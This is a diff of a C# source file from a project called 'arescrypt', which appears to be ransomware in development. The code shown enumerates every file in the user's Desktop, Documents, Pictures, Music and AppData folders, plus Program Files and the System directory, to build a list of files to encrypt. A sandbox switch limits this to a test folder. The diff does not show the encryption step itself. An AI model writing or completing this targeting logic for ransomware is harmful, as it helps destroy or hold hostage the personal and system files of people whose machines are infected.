@@ -1,71 +1,80 @@
-﻿using System;
-using System.Linq;
+﻿// Imports/Libraries
+using System;
+using System.IO;
+using System.Reflection;
+using System.Collections.Generic;
 
 namespace arescrypt
 {
     class Program
     {
-        // DeadPatch was here!
-        static string sessionDomain = Environment.UserDomainName; // get current sessions domain
-        static string sessionUsername = Environment.UserName; // get current sessions username
-        static bool sandBox = true; // Safemode for testing/debugging
+        // Predefinitions
+        public static string sessionDomain = Environment.UserDomainName; // get current sessions domain
+        public static string sessionUsername = Environment.UserName; // get current sessions username
+        public static string currentWorkingDirectory = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
+        private static bool sandBox = true; // Safemode for testing/debugging
+
+        private static string sandBoxDirectory = currentWorkingDirectory + @"\sandboxedDirectory";
 
         static void Main(string[] args)
         {
-            Console.WriteLine("Hello, " + sessionUsername);
+            // Welcome message
+            Console.Write("Hello, " + sessionDomain + @"\" + sessionUsername);
+#if DEBUG
+            Console.Write(". DEBUG mode has been enabled.\n");
+#else
+            Console.Write(". RELEASE mode has been enabled.\n");
+#endif
+            Console.WriteLine("Current path is: " + currentWorkingDirectory + "\n");
+            // End welcome message
 
-            var userSpecificDirs = new System.Collections.Generic.List<string> { };
-            var systemSpecificDirs = new System.Collections.Generic.List<string> { };
+            var userSpecificDirs = new List<string> { "" };
+            var systemSpecificDirs = new List<string> { "" };
+            string[] fullFileIndex = { "" };
 
-            // User specific directories, administrative rights shouldn't be required in order to write to these files
-            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
-            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
-            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
-            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
-            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
-
-            // System specific directories, administrative rights may be required in order to write to these files
-            systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
-            systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
-            systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.System));
-
-            var directoriesToEncrypt = userSpecificDirs.Concat(systemSpecificDirs);
-            var filesToEncrypt = new System.Collections.Generic.List<string> { };
-            foreach (string directory in directoriesToEncrypt.Distinct().ToList())
+            if (sandBox) // == true
+                if (Directory.Exists(sandBoxDirectory))
+                    userSpecificDirs.Add(sandBoxDirectory);
+                else
+                    Console.WriteLine("Sandbox mode was enabled, but no sandbox directory was discovered.\nPlease create this directory: " + sandBoxDirectory);
+            else if (!sandBox)
             {
-                try
-                {
-                    string[] files = System.IO.Directory.GetFiles(directory, "*.*", System.IO.SearchOption.AllDirectories);
-                    foreach (string file in files)
-                    {
-                        string NtAccountName = sessionDomain + @"\" + sessionUsername;
-                        System.IO.DirectoryInfo di = new System.IO.DirectoryInfo(file);
-                        System.Security.AccessControl.DirectorySecurity acl = di.GetAccessControl(System.Security.AccessControl.AccessControlSections.All);
-                        System.Security.AccessControl.AuthorizationRuleCollection rules = acl.GetAccessRules(true, true, typeof(System.Security.Principal.NTAccount));
+                // User specific directories, administrative rights shouldn't be required in order to write to these files
+                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
+                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
+                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
+                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
+                userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
 
-                        //Go through the rules returned from the DirectorySecurity
-                        foreach (System.Security.AccessControl.AuthorizationRule rule in rules)
-                        {
-                            //If we find one that matches the identity we are looking for
-                            if (rule.IdentityReference.Value.Equals(NtAccountName, StringComparison.CurrentCultureIgnoreCase))
-                            {
-                                //Cast to a FileSystemAccessRule to check for access rights
-                                if ((((System.Security.AccessControl.FileSystemAccessRule)rule).FileSystemRights & System.Security.AccessControl.FileSystemRights.WriteData) > 0)
-                                    filesToEncrypt.Add(file); // Application has access to the file we want to write to.
-                                else
-                                    filesToEncrypt.Add(file); // Application has access to the file we want to write to.
-                            }
-                        }
-                    }
-                } catch (UnauthorizedAccessException)
-                { Console.WriteLine("Unable to access: " + directory); }
+                // System specific directories, administrative rights may be required in order to write to these files
+                systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
+                systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
+                systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.System));
+            }
+            
+            var userSpecificFiles = new List<string> { };
+            var systemSpecificFiles = new List<string> { };
+
+            foreach (string dir in userSpecificDirs)
+                foreach (string file in FileHandler.DirSearch(dir))
+                    userSpecificFiles.Add(file);
+            if (sandBox) // == true
+                fullFileIndex = userSpecificFiles.ToArray();
+            else if (!sandBox) // == false
+            {   // Get file index from both Lists' and spawn a Full File Index of all files in every subdirectory
+                foreach (string dir in systemSpecificDirs)
+                    foreach (string file in FileHandler.DirSearch(dir))
+                        systemSpecificFiles.Add(file);
+                fullFileIndex = Misc.concatList(userSpecificFiles, systemSpecificFiles).ToArray();
             }
 
-            foreach (string file in filesToEncrypt)
+            foreach (string file in fullFileIndex)
                 Console.WriteLine(file);
-
+            
+            // Exiting message
             Console.Write("\nPress any key to continue . . . ");
-            Console.ReadKey(); // Hang the console
+            try { Console.ReadKey(); } // Hang the console
+            catch (Exception) { } // Because Mintty doesn't like to "ReadKeys"
         }
     }
 }
